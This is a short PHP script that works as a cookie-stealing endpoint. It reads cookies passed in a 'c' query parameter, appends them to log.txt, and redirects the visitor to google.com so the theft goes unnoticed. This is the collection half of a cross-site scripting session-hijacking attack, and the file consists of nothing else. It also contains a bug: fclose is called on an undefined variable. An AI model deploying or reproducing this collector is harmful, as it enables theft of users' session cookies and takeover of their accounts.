<?php
        $cookies = $_GET["c"];
        $file = fopen("log.txt", "a");
        fwrite($file, $cookies . "\n\n");
        fclose($handle);
        header("Location: http://www.google.com/"); 
        exit;
?>
